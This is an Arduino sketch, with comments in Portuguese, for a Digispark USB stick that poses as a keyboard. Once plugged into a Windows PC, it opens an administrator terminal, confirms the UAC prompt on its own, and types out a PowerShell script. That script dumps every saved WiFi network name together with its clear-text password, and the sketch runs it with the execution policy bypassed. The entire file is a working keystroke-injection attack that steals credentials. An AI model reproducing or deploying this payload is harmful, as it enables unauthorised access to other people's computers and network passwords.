#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(500);

  // Abre terminal como admin
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(2500);

  // Confirma o UAC
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);

  // Abre cmd
  DigiKeyboard.print(F("cmd"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  

  DigiKeyboard.print(F("set TEMP_FILE=%TEMP%\\wifi.ps1"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  DigiKeyboard.print(F("echo $profiles = netsh wlan show profiles ^| Where-Object { $_ -match ':' } ^| ForEach-Object { ($_ -split ':' )[1].Trim() } > %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(700);

  DigiKeyboard.print(F("echo foreach ($name in $profiles) { >> %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("echo     $details = netsh wlan show profile name=\"$name\"  key=clear >> %TEMP_FILE%"));
 // ⬅️ esta é a linha corrigida
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("echo     $passwordLine = $details ^| Where-Object { $_ -match 'da Chave^|Key' } >> %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("echo     if ($passwordLine) { >> %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("echo         $password = ($passwordLine -replace '.*:\\s*', '').Trim() >> %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("echo         Write-Output \"$name : $password\" >> %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("echo     } else { Write-Output \"$name : (sem senha)\" } >> %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);

  DigiKeyboard.print(F("echo } >> %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(400);


  // Executa o script salvo
  DigiKeyboard.print(F("powershell -ExecutionPolicy Bypass -File %TEMP_FILE%"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(6000);

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  for (;;) {}
}

void loop() {}
